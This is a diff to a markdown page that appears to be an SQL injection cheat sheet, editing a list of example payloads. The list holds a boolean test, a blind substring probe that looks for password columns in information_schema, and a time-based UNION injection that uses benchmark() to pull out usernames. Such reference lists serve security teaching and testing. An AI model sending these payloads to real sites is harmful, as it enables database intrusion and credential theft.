@@ -66,7 +66,7 @@ User input is stored and reused as is in a different function that has no protec
 ```
 - ?user=1' and 1=1 -- //
 - ?user=admin' and substring((select table_name from information_schema.columns where column_name = 'password' LIMIT 1),1,1)>'a' -- // 
-- ?user=1' union select if (substring(username,1,1) > 'd', benchmark(100000000, encode('txt','secret')),null) from users where id=1 -- // 
+- ?user=1' union select 1,2,3,4, if (substring(username,1,1) > 'd', benchmark(100000000, encode('txt','secret')),null) from users where id=1 -- // 
 ``` 
 
 ## OS interaction
